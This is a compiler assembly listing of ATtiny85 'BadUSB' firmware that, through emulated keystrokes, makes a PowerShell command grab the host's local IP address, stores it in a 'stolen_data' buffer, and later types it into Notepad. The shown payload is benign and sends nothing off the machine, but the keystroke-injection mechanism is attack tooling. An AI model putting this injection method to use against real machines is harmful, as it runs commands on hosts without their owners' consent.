000012 0a4e      	.DB  0x43,0x4D,0x44,0x3A,0x52,0x55,0x4E,0xA
C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1087): warning: .cseg .db misalignment - padding zero byte
000013 0000      	.DB  0x0
                 _KEY_ENTER:
000014 454b
000015 3a59
000016 4e45
000017 4554      	.DB  0x4B,0x45,0x59,0x3A,0x45,0x4E,0x54,0x45
000018 0a52
C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1090): warning: .cseg .db misalignment - padding zero byte
000019 0000      	.DB  0x52,0xA,0x0
                 
                 _0x0:
00001a 4544
00001b 5542
00001c 3a47
00001d 2a20      	.DB  0x44,0x45,0x42,0x55,0x47,0x3A,0x20,0x2A
00001e 2a2a
00001f 4220
000020 4f4f
000021 4954      	.DB  0x2A,0x2A,0x20,0x42,0x4F,0x4F,0x54,0x49
000022 474e
000023 5520
000024 2050
000025 2a2a      	.DB  0x4E,0x47,0x20,0x55,0x50,0x20,0x2A,0x2A
000026 0a2a
000027 4400
000028 4245
000029 4755      	.DB  0x2A,0xA,0x0,0x44,0x45,0x42,0x55,0x47
00002a 503a
00002b 6168
00002c 6573
00002d 3120      	.DB  0x3A,0x50,0x68,0x61,0x73,0x65,0x20,0x31
00002e 2d20
00002f 4720
000030 7465
000031 6974      	.DB  0x20,0x2D,0x20,0x47,0x65,0x74,0x74,0x69
000032 676e
000033 4920
000034 0a50
000035 5400      	.DB  0x6E,0x67,0x20,0x49,0x50,0xA,0x0,0x54
000036 5059
000037 3a45
000038 6f70
000039 6577      	.DB  0x59,0x50,0x45,0x3A,0x70,0x6F,0x77,0x65
00003a 7372
00003b 6568
00003c 6c6c
00003d 2220      	.DB  0x72,0x73,0x68,0x65,0x6C,0x6C,0x20,0x22
00003e 6553
00003f 2d74
000040 6c43
000041 7069      	.DB  0x53,0x65,0x74,0x2D,0x43,0x6C,0x69,0x70
000042 6f62
000043 7261
000044 2064
000045 562d      	.DB  0x62,0x6F,0x61,0x72,0x64,0x20,0x2D,0x56
000046 6c61
000047 6575
000048 2820
000049 6547      	.DB  0x61,0x6C,0x75,0x65,0x20,0x28,0x47,0x65
00004a 2d74
00004b 654e
00004c 4974
00004d 4150      	.DB  0x74,0x2D,0x4E,0x65,0x74,0x49,0x50,0x41
00004e 6464
00004f 6572
000050 7373
000051 2d20      	.DB  0x64,0x64,0x72,0x65,0x73,0x73,0x20,0x2D
000052 6441
000053 7264
000054 7365
000055 4673      	.DB  0x41,0x64,0x64,0x72,0x65,0x73,0x73,0x46
000056 6d61
000057 6c69
000058 2079
000059 5049      	.DB  0x61,0x6D,0x69,0x6C,0x79,0x20,0x49,0x50
00005a 3476
00005b 2e29
00005c 5049
00005d 6441      	.DB  0x76,0x34,0x29,0x2E,0x49,0x50,0x41,0x64
00005e 7264
00005f 7365
000060 5b73
000061 5d30      	.DB  0x64,0x72,0x65,0x73,0x73,0x5B,0x30,0x5D
000062 0a22
000063 4100
000064 5443
000065 4f49      	.DB  0x22,0xA,0x0,0x41,0x43,0x54,0x49,0x4F
000066 3a4e
000067 4547
000068 5f54
000069 4c43      	.DB  0x4E,0x3A,0x47,0x45,0x54,0x5F,0x43,0x4C
00006a 5049
00006b 000a
00006c 4544
00006d 5542      	.DB  0x49,0x50,0xA,0x0,0x44,0x45,0x42,0x55
00006e 3a47
00006f 4920
000070 2050
000071 6153      	.DB  0x47,0x3A,0x20,0x49,0x50,0x20,0x53,0x61
000072 6576
000073 2e64
000074 4520
000075 746e      	.DB  0x76,0x65,0x64,0x2E,0x20,0x45,0x6E,0x74
000076 7265
000077 6e69
000078 2067
000079 6850      	.DB  0x65,0x72,0x69,0x6E,0x67,0x20,0x50,0x68
00007a 7361
00007b 2065
00007c 2032
00007d 4c28      	.DB  0x61,0x73,0x65,0x20,0x32,0x20,0x28,0x4C
00007e 6f6f
00007f 2970
000080 0a2e
000081 4400      	.DB  0x6F,0x6F,0x70,0x29,0x2E,0xA,0x0,0x44
000082 4245
000083 4755
000084 423a
000085 7475      	.DB  0x45,0x42,0x55,0x47,0x3A,0x42,0x75,0x74
000086 6f74
000087 206e
000088 7250
000089 7365      	.DB  0x74,0x6F,0x6E,0x20,0x50,0x72,0x65,0x73
00008a 6573
00008b 2164
00008c 000a
00008d 5954      	.DB  0x73,0x65,0x64,0x21,0xA,0x0,0x54,0x59
00008e 4550
00008f 6e3a
000090 746f
000091 7065      	.DB  0x50,0x45,0x3A,0x6E,0x6F,0x74,0x65,0x70
000092 6461
000093 000a
000094 5954
000095 4550      	.DB  0x61,0x64,0xA,0x0,0x54,0x59,0x50,0x45
000096 593a
000097 756f
000098 2072
000099 5049      	.DB  0x3A,0x59,0x6F,0x75,0x72,0x20,0x49,0x50
00009a 6920
00009b 3a73
00009c 0020
00009d 4544      	.DB  0x20,0x69,0x73,0x3A,0x20,0x0,0x44,0x45
00009e 5542
00009f 3a47
0000a0 6f44
0000a1 656e      	.DB  0x42,0x55,0x47,0x3A,0x44,0x6F,0x6E,0x65
0000a2 5420
0000a3 7079
0000a4 6e69
0000a5 2e67      	.DB  0x20,0x54,0x79,0x70,0x69,0x6E,0x67,0x2E
0000a6 5220
0000a7 6c65
0000a8 6165
0000a9 6573      	.DB  0x20,0x52,0x65,0x6C,0x65,0x61,0x73,0x65
0000aa 4220
0000ab 7475
0000ac 6f74
0000ad 2e6e      	.DB  0x20,0x42,0x75,0x74,0x74,0x6F,0x6E,0x2E
0000ae 000a
0000af 4544
0000b0 5542
0000b1 3a47      	.DB  0xA,0x0,0x44,0x45,0x42,0x55,0x47,0x3A
0000b2 7542
0000b3 7474
0000b4 6e6f
0000b5 5220      	.DB  0x42,0x75,0x74,0x74,0x6F,0x6E,0x20,0x52
0000b6 6c65
0000b7 6165
0000b8 6573
0000b9 2e64      	.DB  0x65,0x6C,0x65,0x61,0x73,0x65,0x64,0x2E
0000ba 5720
0000bb 6961
0000bc 6974
0000bd 676e      	.DB  0x20,0x57,0x61,0x69,0x74,0x69,0x6E,0x67
0000be 2e2e
0000bf 0a2e
C:\Users\Surface\Documents\CSL_Project_Main\codevision\Debug\List\vay.asm(1134): warning: .cseg .db misalignment - padding zero byte
0000c0 0000      	.DB  0x2E,0x2E,0x2E,0xA,0x0
                 __RESET:
0000c1 94f8      	CLI
0000c2 27ee      	CLR  R30
0000c3 bbec      	OUT  EECR,R30
0000c4 bfe5      	OUT  MCUCR,R30
                 
                 ;CLEAR R2-R14
0000c5 e08d      	LDI  R24,(14-2)+1
0000c6 e0a2      	LDI  R26,2
0000c7 27bb      	CLR  R27
                 __CLEAR_REG:
0000c8 93ed      	ST   X+,R30
0000c9 958a      	DEC  R24
0000ca f7e9      	BRNE __CLEAR_REG
                 
                 ;CLEAR SRAM
0000cb e080      	LDI  R24,LOW(__CLEAR_SRAM_SIZE)
0000cc e092      	LDI  R25,HIGH(__CLEAR_SRAM_SIZE)
0000cd e6a0      	LDI  R26,__SRAM_START
                 __CLEAR_SRAM:
0000ce 93ed      	ST   X+,R30
0000cf 9701      	SBIW R24,1
0000d0 f7e9      	BRNE __CLEAR_SRAM
                 
                 ;GPIOR0-GPIOR2 INITIALIZATION
0000d1 e0e0      	LDI  R30,__GPIOR0_INIT
0000d2 bbe1      	OUT  GPIOR0,R30
                 	;__GPIOR1_INIT = __GPIOR0_INIT
0000d3 bbe2      	OUT  GPIOR1,R30
                 	;__GPIOR2_INIT = __GPIOR0_INIT
0000d4 bbe3      	OUT  GPIOR2,R30
                 
                 ;HARDWARE STACK POINTER INITIALIZATION
0000d5 e5ef      	LDI  R30,LOW(__SRAM_END-__HEAP_SIZE)
0000d6 bfed      	OUT  SPL,R30
0000d7 e0e2      	LDI  R30,HIGH(__SRAM_END-__HEAP_SIZE)
0000d8 bfee      	OUT  SPH,R30
                 
                 ;DATA STACK POINTER INITIALIZATION
0000d9 eec0      	LDI  R28,LOW(__SRAM_START+__DSTACK_SIZE)
0000da e0d0      	LDI  R29,HIGH(__SRAM_START+__DSTACK_SIZE)
                 
0000db c052      	RJMP _main
                 
                 	.ESEG
                 	.ORG 0
                 
                 	.DSEG
                 	.ORG 0xE0
                 
                 	.CSEG
                 ;/*******************************************************
                 ;Project : Debugged BadUSB Final
                 ;Chip    : ATtiny85
                 ;Clock   : 8.000000 MHz
                 ;*******************************************************/
                 ;
                 ;#include <tiny85.h>
                 	#ifndef __SLEEP_DEFINED__
                 	#define __SLEEP_DEFINED__
                 	.EQU __se_bit=0x20
                 	.EQU __sm_mask=0x18
                 	.EQU __sm_adc_noise_red=0x08
                 	.EQU __sm_powerdown=0x10
                 	.EQU __sm_standby=0x18
                 	.SET power_ctrl_reg=mcucr
                 	#endif
                 ;#include <delay.h>
                 ;
                 ;#define TX_PIN PORTB.0
                 ;#define TX_DDR DDRB.0
                 ;#define RX_PIN PINB.1
                 ;#define RX_DDR DDRB.1
                 ;// ???? ??? ???? 3 ?????? (PB4)
                 ;#define BTN_PIN PINB.4
                 ;#define BTN_DDR DDRB.4
                 ;#define BTN_PORT PORTB.4
                 ;
                 ;#define BIT_DELAY_US 208    // ???? 104 ???
                 ;#define HALF_BIT_DELAY_US 104 // ???? 52 ???
                 ;
                 ;char stolen_data[35]; // ?????? ??? ???? ???? ???????
                 ;
                 ;void uart_tx(char data) {
                 ; 0000 0018 void uart_tx(char data) {
                 
                 	.CSEG
                 _uart_tx:
                 ; .FSTART _uart_tx
                 ; 0000 0019     unsigned char i;
                 ; 0000 001A     TX_PIN = 0; delay_us(BIT_DELAY_US);
0000dc 93aa      	ST   -Y,R26
0000dd 931a      	ST   -Y,R17
                 ;	data -> Y+1
                 ;	i -> R17
0000de 98c0      	CBI  0x18,0
0000df d0bc      	RCALL SUBOPT_0x0
                 ; 0000 001B     for (i = 0; i < 8; i++) {
0000e0 e010      	LDI  R17,LOW(0)
                 _0x6:
0000e1 3018      	CPI  R17,8
0000e2 f460      	BRSH _0x7
                 ; 0000 001C         if (data & 1) TX_PIN = 1; else TX_PIN = 0;
0000e3 81e9      	LDD  R30,Y+1
0000e4 70e1      	ANDI R30,LOW(0x1)
0000e5 f011      	BREQ _0x8
0000e6 9ac0      	SBI  0x18,0
0000e7 c001      	RJMP _0xB
                 _0x8:
0000e8 98c0      	CBI  0x18,0
                 ; 0000 001D         data >>= 1; delay_us(BIT_DELAY_US);
                 _0xB:
0000e9 81e9      	LDD  R30,Y+1
0000ea 95e6      	LSR  R30
0000eb 83e9      	STD  Y+1,R30
0000ec d0af      	RCALL SUBOPT_0x0
                 ; 0000 001E     }
0000ed 5f1f      	SUBI R17,-1
0000ee cff2      	RJMP _0x6
                 _0x7:
                 ; 0000 001F     TX_PIN = 1; delay_us(BIT_DELAY_US);
0000ef 9ac0      	SBI  0x18,0
0000f0 d0ab      	RCALL SUBOPT_0x0
                 ; 0000 0020 }
0000f1 8118      	LDD  R17,Y+0
0000f2 c01e      	RJMP _0x2000002
                 ; .FEND
                 ;
                 ;void uart_print_flash(flash char *str) {
                 ; 0000 0022 void uart_print_flash(flash char *str) {
                 _uart_print_flash:
                 ; .FSTART _uart_print_flash
                 ; 0000 0023     while (*str) uart_tx(*str++);
0000f3 93ba      	ST   -Y,R27
0000f4 93aa      	ST   -Y,R26
                 ;	*str -> Y+0
                 _0x10:
0000f5 81e8      	LD   R30,Y
0000f6 81f9      	LDD  R31,Y+1
0000f7 91e4      	LPM  R30,Z
0000f8 30e0      	CPI  R30,0
0000f9 f049      	BREQ _0x12
0000fa 81e8      	LD   R30,Y
0000fb 81f9      	LDD  R31,Y+1
0000fc 9631      	ADIW R30,1
0000fd 83e8      	ST   Y,R30
0000fe 83f9      	STD  Y+1,R31
0000ff 9731      	SBIW R30,1
000100 91a4      	LPM  R26,Z
000101 dfda      	RCALL _uart_tx
000102 cff2      	RJMP _0x10
                 _0x12:
                 ; 0000 0024 }
000103 c00d      	RJMP _0x2000002
                 ; .FEND
                 ;
                 ;void uart_print_ram(char *str) {
                 ; 0000 0026 void uart_print_ram(char *str) {
                 _uart_print_ram:
                 ; .FSTART _uart_print_ram
                 ; 0000 0027     while (*str) uart_tx(*str++);
000104 93ba      	ST   -Y,R27
000105 93aa      	ST   -Y,R26
                 ;	*str -> Y+0
                 _0x13:
000106 81a8      	LD   R26,Y
000107 81b9      	LDD  R27,Y+1
000108 91ec      	LD   R30,X
000109 30e0      	CPI  R30,0
00010a f031      	BREQ _0x15
00010b 91ed      	LD   R30,X+
00010c 83a8      	ST   Y,R26
00010d 83b9      	STD  Y+1,R27
00010e 2fae      	MOV  R26,R30
00010f dfcc      	RCALL _uart_tx
000110 cff5      	RJMP _0x13
                 _0x15:
                 ; 0000 0028 }
                 _0x2000002:
000111 9622      	ADIW R28,2
000112 9508      	RET
                 ; .FEND
                 ;
                 ;char uart_rx(void) {
                 ; 0000 002A char uart_rx(void) {
                 _uart_rx:
                 ; .FSTART _uart_rx
                 ; 0000 002B     unsigned char i;
                 ; 0000 002C     char data = 0;
                 ; 0000 002D     while (RX_PIN == 1);
000113 d0a6      	RCALL __SAVELOCR2
                 ;	i -> R17
                 ;	data -> R16
000114 e000      	LDI  R16,0
                 _0x16:
000115 99b1      	SBIC 0x16,1
000116 cffe      	RJMP _0x16
                 ; 0000 002E     delay_us(HALF_BIT_DELAY_US);
                +
000117 ed80     +LDI R24 , LOW ( 208 )
000118 e090     +LDI R25 , HIGH ( 208 )
                +__DELAY_USW_LOOP :
000119 9701     +SBIW R24 , 1
00011a f7f1     +BRNE __DELAY_USW_LOOP
                 	__DELAY_USW 208
                 ; 0000 002F     if (RX_PIN == 1) return 0;
00011b 9bb1      	SBIS 0x16,1
00011c c002      	RJMP _0x19
00011d e0e0      	LDI  R30,LOW(0)
00011e c00c      	RJMP _0x2000001
                 ; 0000 0030     delay_us(BIT_DELAY_US);
                 _0x19:
00011f d07c      	RCALL SUBOPT_0x0
                 ; 0000 0031     for (i = 0; i < 8; i++) {
000120 e010      	LDI  R17,LOW(0)
                 _0x1B:
000121 3018      	CPI  R17,8
000122 f430      	BRSH _0x1C
                 ; 0000 0032         data >>= 1;
000123 9506      	LSR  R16
                 ; 0000 0033         if (RX_PIN == 1) data |= 0x80;
000124 99b1      	SBIC 0x16,1
000125 6800      	ORI  R16,LOW(128)
                 ; 0000 0034         delay_us(BIT_DELAY_US);
000126 d075      	RCALL SUBOPT_0x0
                 ; 0000 0035     }
000127 5f1f      	SUBI R17,-1
000128 cff8      	RJMP _0x1B
                 _0x1C:
                 ; 0000 0036     delay_us(BIT_DELAY_US);
000129 d072      	RCALL SUBOPT_0x0
                 ; 0000 0037     return data;
00012a 2fe0      	MOV  R30,R16
                 _0x2000001:
00012b 9109      	LD   R16,Y+
00012c 9119      	LD   R17,Y+
00012d 9508      	RET
                 ; 0000 0038 }
                 ; .FEND
                 ;
                 ;flash char CMD_RUN[] = "CMD:RUN\n";
                 ;flash char KEY_ENTER[] = "KEY:ENTER\n";
                 ;
                 ;void main(void) {
                 ; 0000 003D void main(void) {
                 _main:
                 ; .FSTART _main
                 ; 0000 003E     int i;
                 ; 0000 003F 
                 ; 0000 0040     // 1. ??????? ?????
                 ; 0000 0041     TX_DDR = 1; TX_PIN = 1;
                 ;	i -> R16,R17
00012e 9ab8      	SBI  0x17,0
00012f 9ac0      	SBI  0x18,0
                 ; 0000 0042     RX_DDR = 0;
000130 98b9      	CBI  0x17,1
                 ; 0000 0043     BTN_DDR = 0; BTN_PORT = 1; // Pull-up ????? ????
000131 98bc      	CBI  0x17,4
000132 9ac4      	SBI  0x18,4
                 ; 0000 0044 
                 ; 0000 0045     delay_ms(500);
000133 d06d      	RCALL SUBOPT_0x1
                 ; 0000 0046 
                 ; 0000 0047     // *** ??? ????: ??? ???? ??? ?? ??? ???? ??? ??? ????? ***
                 ; 0000 0048     uart_print_flash("DEBUG: *** BOOTING UP ***\n");
                +
000134 e3a4     +LDI R26 , LOW ( 2 * _0x0 + ( 0 ) )
000135 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 0 ) )
                 	__POINTW2FN _0x0,0
000136 dfbc      	RCALL _uart_print_flash
                 ; 0000 0049 
                 ; 0000 004A     // --- ??? 1: ?????? ????? ---
                 ; 0000 004B     uart_print_flash("DEBUG:Phase 1 - Getting IP\n");
                +
000137 e4af     +LDI R26 , LOW ( 2 * _0x0 + ( 27 ) )
000138 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 27 ) )
                 	__POINTW2FN _0x0,27
000139 d06a      	RCALL SUBOPT_0x2
                 ; 0000 004C 
                 ; 0000 004D     uart_print_flash(CMD_RUN);
                 ; 0000 004E     delay_ms(500);
                 ; 0000 004F     // ????? ??????
                 ; 0000 0050     uart_print_flash("TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n");
                +
00013a e6ab     +LDI R26 , LOW ( 2 * _0x0 + ( 55 ) )
00013b e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 55 ) )
                 	__POINTW2FN _0x0,55
00013c dfb6      	RCALL _uart_print_flash
                 ; 0000 0051     delay_ms(500);
00013d d063      	RCALL SUBOPT_0x1
                 ; 0000 0052     uart_print_flash(KEY_ENTER);
00013e e2a8      	LDI  R26,LOW(_KEY_ENTER*2)
00013f e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
000140 dfb2      	RCALL _uart_print_flash
                 ; 0000 0053 
                 ; 0000 0054     delay_ms(3000); // ??? ???? ????? ??????
000141 eba8      	LDI  R26,LOW(3000)
000142 e0bb      	LDI  R27,HIGH(3000)
000143 d06c      	RCALL _delay_ms
                 ; 0000 0055 
                 ; 0000 0056     uart_print_flash("ACTION:GET_CLIP\n");
                +
000144 eca7     +LDI R26 , LOW ( 2 * _0x0 + ( 147 ) )
000145 e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 147 ) )
                 	__POINTW2FN _0x0,147
000146 dfac      	RCALL _uart_print_flash
                 ; 0000 0057 
                 ; 0000 0058     // ??????? ????
                 ; 0000 0059     for(i=0; i<35; i++) stolen_data[i] = 0;
                +
000147 e000     +LDI R16 , LOW ( 0 )
000148 e010     +LDI R17 , HIGH ( 0 )
                 	__GETWRN 16,17,0
                 _0x29:
                +
000149 3203     +CPI R16 , LOW ( 35 )
00014a e0e0     +LDI R30 , HIGH ( 35 )
00014b 071e     +CPC R17 , R30
                 	__CPWRN 16,17,35
00014c f424      	BRGE _0x2A
00014d d05b      	RCALL SUBOPT_0x3
                +
00014e 5f0f     +SUBI R16 , LOW ( - 1 )
00014f 4f1f     +SBCI R17 , HIGH ( - 1 )
                 	__ADDWRN 16,17,1
000150 cff8      	RJMP _0x29
                 _0x2A:
                 ; 0000 005C for(i=0; i<30; i++) {
                +
000151 e000     +LDI R16 , LOW ( 0 )
000152 e010     +LDI R17 , HIGH ( 0 )
                 	__GETWRN 16,17,0
                 _0x2C:
                +
000153 310e     +CPI R16 , LOW ( 30 )
000154 e0e0     +LDI R30 , HIGH ( 30 )
000155 071e     +CPC R17 , R30
                 	__CPWRN 16,17,30
000156 f4a4      	BRGE _0x2D
                 ; 0000 005D         char c = uart_rx();
                 ; 0000 005E         if(c == '\n' || c == '\r') {
000157 9721      	SBIW R28,1
                 ;	c -> Y+0
000158 dfba      	RCALL _uart_rx
000159 83e8      	ST   Y,R30
00015a 81a8      	LD   R26,Y
00015b 30aa      	CPI  R26,LOW(0xA)
00015c f011      	BREQ _0x2F
00015d 30ad      	CPI  R26,LOW(0xD)
00015e f419      	BRNE _0x2E
                 _0x2F:
                 ; 0000 005F             stolen_data[i] = 0;
00015f d049      	RCALL SUBOPT_0x3
                 ; 0000 0060             break;
000160 9621      	ADIW R28,1
000161 c009      	RJMP _0x2D
                 ; 0000 0061         }
                 ; 0000 0062         stolen_data[i] = c;
                 _0x2E:
000162 01f8      	MOVW R30,R16
000163 52e0      	SUBI R30,LOW(-_stolen_data)
000164 4fff      	SBCI R31,HIGH(-_stolen_data)
000165 81a8      	LD   R26,Y
000166 83a0      	STD  Z+0,R26
                 ; 0000 0063     }
000167 9621      	ADIW R28,1
                +
000168 5f0f     +SUBI R16 , LOW ( - 1 )
000169 4f1f     +SBCI R17 , HIGH ( - 1 )
                 	__ADDWRN 16,17,1
00016a cfe8      	RJMP _0x2C
                 _0x2D:
                 ; 0000 0064 
                 ; 0000 0065     uart_print_flash("DEBUG: IP Saved. Entering Phase 2 (Loop).\n");
                +
00016b eda8     +LDI R26 , LOW ( 2 * _0x0 + ( 164 ) )
00016c e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 164 ) )
                 	__POINTW2FN _0x0,164
00016d df85      	RCALL _uart_print_flash
                 ; 0000 0066 
                 ; 0000 0067     // --- ??? 2: ???? ?? ???? ???? ---
                 ; 0000 0068     while (1) {
                 _0x31:
                 ; 0000 0069         // ?? ???? ???? (Active Low)
                 ; 0000 006A         if (BTN_PIN == 0) {
00016e 99b4      	SBIC 0x16,4
00016f c02a      	RJMP _0x34
                 ; 0000 006B             delay_ms(50); // ?????? ?????
000170 e3a2      	LDI  R26,LOW(50)
000171 e0b0      	LDI  R27,0
000172 d03d      	RCALL _delay_ms
                 ; 0000 006C             if (BTN_PIN == 0) {
000173 99b4      	SBIC 0x16,4
000174 c025      	RJMP _0x35
                 ; 0000 006D                 // ???? ????? ??
                 ; 0000 006E                 uart_print_flash("DEBUG:Button Pressed!\n");
                +
000175 e0a3     +LDI R26 , LOW ( 2 * _0x0 + ( 207 ) )
000176 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 207 ) )
                 	__POINTW2FN _0x0,207
000177 d02c      	RCALL SUBOPT_0x2
                 ; 0000 006F 
                 ; 0000 0070                 // ??? ???? Notepad
                 ; 0000 0071                 uart_print_flash(CMD_RUN);
                 ; 0000 0072                 delay_ms(500);
                 ; 0000 0073                 uart_print_flash("TYPE:notepad\n");
                +
000178 e1aa     +LDI R26 , LOW ( 2 * _0x0 + ( 230 ) )
000179 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 230 ) )
                 	__POINTW2FN _0x0,230
00017a df78      	RCALL _uart_print_flash
                 ; 0000 0074                 delay_ms(100);
00017b e6a4      	LDI  R26,LOW(100)
00017c e0b0      	LDI  R27,0
00017d d032      	RCALL _delay_ms
                 ; 0000 0075                 uart_print_flash(KEY_ENTER);
00017e e2a8      	LDI  R26,LOW(_KEY_ENTER*2)
00017f e0b0      	LDI  R27,HIGH(_KEY_ENTER*2)
000180 df72      	RCALL _uart_print_flash
                 ; 0000 0076 
                 ; 0000 0077                 delay_ms(1000); // ??? ???? ??? ??? ??? ??
000181 eea8      	LDI  R26,LOW(1000)
000182 e0b3      	LDI  R27,HIGH(1000)
000183 d02c      	RCALL _delay_ms
                 ; 0000 0078 
                 ; 0000 0079                 // ???? ????? ????? ???
                 ; 0000 007A                 uart_print_flash("TYPE:Your IP is: ");
                +
000184 e2a8     +LDI R26 , LOW ( 2 * _0x0 + ( 244 ) )
000185 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 244 ) )
                 	__POINTW2FN _0x0,244
000186 df6c      	RCALL _uart_print_flash
                 ; 0000 007B                 uart_print_ram(stolen_data);
000187 eea0      	LDI  R26,LOW(_stolen_data)
000188 e0b0      	LDI  R27,HIGH(_stolen_data)
000189 df7a      	RCALL _uart_print_ram
                 ; 0000 007C                 uart_print_flash("\n");
                +
00018a e4ad     +LDI R26 , LOW ( 2 * _0x0 + ( 25 ) )
00018b e0b0     +LDI R27 , HIGH ( 2 * _0x0 + ( 25 ) )
                 	__POINTW2FN _0x0,25
00018c df66      	RCALL _uart_print_flash
                 ; 0000 007D 
                 ; 0000 007E                 uart_print_flash("DEBUG:Done Typing. Release Button.\n");
                +
00018d e3aa     +LDI R26 , LOW ( 2 * _0x0 + ( 262 ) )
00018e e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 262 ) )
                 	__POINTW2FN _0x0,262
00018f df63      	RCALL _uart_print_flash
                 ; 0000 007F 
                 ; 0000 0080                 // ?? ????? ?? ??? ??? ???? ??? ?????? ???? (??????? ?? ?????)
                 ; 0000 0081                 while(BTN_PIN == 0) {
                 _0x36:
000190 99b4      	SBIC 0x16,4
000191 c004      	RJMP _0x38
                 ; 0000 0082                     delay_ms(10);
000192 e0aa      	LDI  R26,LOW(10)
000193 e0b0      	LDI  R27,0
000194 d01b      	RCALL _delay_ms
                 ; 0000 0083                 }
000195 cffa      	RJMP _0x36
                 _0x38:
                 ; 0000 0084 
                 ; 0000 0085                 uart_print_flash("DEBUG:Button Released. Waiting...\n");
                +
000196 e5ae     +LDI R26 , LOW ( 2 * _0x0 + ( 298 ) )
000197 e0b1     +LDI R27 , HIGH ( 2 * _0x0 + ( 298 ) )
                 	__POINTW2FN _0x0,298
000198 df5a      	RCALL _uart_print_flash
                 ; 0000 0086                 delay_ms(500);
000199 d007      	RCALL SUBOPT_0x1
                 ; 0000 0087             }
                 ; 0000 0088         }
                 _0x35:
                 ; 0000 0089     }
                 _0x34:
00019a cfd3      	RJMP _0x31
                 ; 0000 008A }
                 _0x39:
00019b cfff      	RJMP _0x39
                 ; .FEND
                 
                 	.DSEG
                 _stolen_data:
0000e0           	.BYTE 0x23
                 
                 	.CSEG
                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 6 TIMES, CODE SIZE REDUCTION:13 WORDS
                 SUBOPT_0x0:
                +
00019c ea80     +LDI R24 , LOW ( 416 )
00019d e091     +LDI R25 , HIGH ( 416 )
                +__DELAY_USW_LOOP :
00019e 9701     +SBIW R24 , 1
00019f f7f1     +BRNE __DELAY_USW_LOOP
                 	__DELAY_USW 416
0001a0 9508      	RET
                 
                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 5 TIMES, CODE SIZE REDUCTION:6 WORDS
                 SUBOPT_0x1:
0001a1 efa4      	LDI  R26,LOW(500)
0001a2 e0b1      	LDI  R27,HIGH(500)
0001a3 c00c      	RJMP _delay_ms
                 
                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:2 WORDS
                 SUBOPT_0x2:
0001a4 df4e      	RCALL _uart_print_flash
0001a5 e1ae      	LDI  R26,LOW(_CMD_RUN*2)
0001a6 e0b0      	LDI  R27,HIGH(_CMD_RUN*2)
0001a7 df4b      	RCALL _uart_print_flash
0001a8 cff8      	RJMP SUBOPT_0x1
                 
                 ;OPTIMIZER ADDED SUBROUTINE, CALLED 2 TIMES, CODE SIZE REDUCTION:3 WORDS
                 SUBOPT_0x3:
0001a9 eea0      	LDI  R26,LOW(_stolen_data)
0001aa e0b0      	LDI  R27,HIGH(_stolen_data)
0001ab 0fa0      	ADD  R26,R16
0001ac 1fb1      	ADC  R27,R17
0001ad e0e0      	LDI  R30,LOW(0)
0001ae 93ec      	ST   X,R30
0001af 9508      	RET
                 
                 
                 	.CSEG
                 _delay_ms:
0001b0 9610      	adiw r26,0
0001b1 f039      	breq __delay_ms1
                 __delay_ms0:
0001b2 95a8      	wdr
                +
0001b3 ed80     +LDI R24 , LOW ( 0x7D0 )
0001b4 e097     +LDI R25 , HIGH ( 0x7D0 )
                +__DELAY_USW_LOOP :
0001b5 9701     +SBIW R24 , 1
0001b6 f7f1     +BRNE __DELAY_USW_LOOP
                 	__DELAY_USW 0x7D0
0001b7 9711      	sbiw r26,1
0001b8 f7c9      	brne __delay_ms0
                 __delay_ms1:
0001b9 9508      	ret
                 
                 __SAVELOCR2:
0001ba 931a      	ST   -Y,R17
0001bb 930a      	ST   -Y,R16
0001bc 9508      	RET
                 
                 ;END OF CODE MARKER
                 __END_OF_CODE:


RESOURCE USE INFORMATION
------------------------

Notice:
The register and instruction counts are symbol table hit counts,
and hence implicitly used resources are not counted, eg, the
'lpm' instruction without operands implicitly uses r0 and z,
none of which are counted.

x,y,z are separate entities in the symbol table and are
counted separately from r26..r31 here.

.dseg memory usage only counts static data declared with .byte

ATtiny85 register use summary:
r0 :   0 r1 :   0 r2 :   0 r3 :   0 r4 :   0 r5 :   0 r6 :   0 r7 :   0 
r8 :   0 r9 :   0 r10:   0 r11:   0 r12:   0 r13:   0 r14:   0 r15:   0 
r16:  14 r17:  17 r18:   0 r19:   0 r20:   0 r21:   0 r22:   0 r23:   0 
r24:  10 r25:   4 r26:  39 r27:  28 r28:   5 r29:   1 r30:  40 r31:   4 
x  :   5 y  :  27 z  :   3 
Registers used: 13 out of 35 (37.1%)

ATtiny85 instruction use summary:
.lds  :   0 .lds.l:   0 .sts  :   0 .sts.l:   0 adc   :   1 add   :   1 
adiw  :   5 and   :   0 andi  :   1 asr   :   0 bclr  :   0 bld   :   0 
brbc  :   0 brbs  :   0 brcc  :   0 brcs  :   0 break :   0 breq  :   5 
brge  :   2 brhc  :   0 brhs  :   0 brid  :   0 brie  :   0 brlo  :   0 
brlt  :   0 brmi  :   0 brne  :   7 brpl  :   0 brsh  :   2 brtc  :   0 
brts  :   0 brvc  :   0 brvs  :   0 bset  :   0 bst   :   0 cbi   :   4 
cbr   :   0 clc   :   0 clh   :   0 cli   :   1 cln   :   0 clr   :   2 
cls   :   0 clt   :   0 clv   :   0 clz   :   0 com   :   0 cp    :   0 
cpc   :   2 cpi   :   8 cpse  :   0 dec   :   1 des   :   0 eor   :   0 
fmul  :   0 fmuls :   0 fmulsu:   0 icall :   0 ijmp  :   0 in    :   0 
inc   :   0 ld    :   9 ldd   :   6 ldi   :  71 lds   :   0 lpm   :   4 
lsl   :   0 lsr   :   2 mov   :   2 movw  :   1 mul   :   0 muls  :   0 
mulsu :   0 neg   :   0 nop   :   0 or    :   0 ori   :   1 out   :   7 
